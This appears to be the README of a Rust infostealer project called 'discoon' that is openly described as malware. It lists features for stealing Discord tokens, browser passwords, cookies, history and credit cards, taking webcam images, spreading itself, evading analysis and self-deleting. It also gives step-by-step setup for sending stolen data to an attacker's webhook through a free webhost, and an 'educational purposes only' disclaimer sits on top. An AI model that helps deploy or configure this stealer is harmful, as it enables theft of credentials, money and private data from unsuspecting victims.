### Educational purposes only
Don't use this project maliciously. 

### How it works
This is a malware written in Rust that steals the information the attacker chooses to steal and sends that through a server to the attacker's webhook.

### Features
- Grab IP Address
- Anti analysis
- Webhook protection
- Auto spread
- Site blocker
- Self-delete
- Copy to temp
- Trace token
- Steal discord tokens
- Steal browser passwords
- Steal browser cookies
- Steal browsing history
- Steal credit cards
- Take screenshot
- Take webcam image

### Prerequisites
1. Install [rust](https://www.rust-lang.org/tools/install)
2. Install windows [toolchain](https://rust-lang.github.io/rustup/installation/windows.html)

### Setup
1. Go to [upload.php](https://github.com/RadonCoding/discoon/blob/main/res/upload.php#L3) and set the webhook
2. Get a webhost you can get a free one from [here](https://www.000webhost.com/)
3. Upload the [upload.php](https://github.com/RadonCoding/discoon/blob/main/res/upload.php) to your webhost
4. Change the `BACKEND` in [constants.rs](https://github.com/RadonCoding/discoon/blob/main/src/constants.rs#L47) to your webhost
5. Configure the options however you like
6. Run `cargo build --release --target=x86_64-pc-windows-msvc`

### Contributing
1. Fork it
2. Create your branch (`git checkout -b my-change`)
3. Commit your changes (`git commit -am 'changed something'`)
4. Push to the branch (`git push origin my-change`)
5. Create new pull request
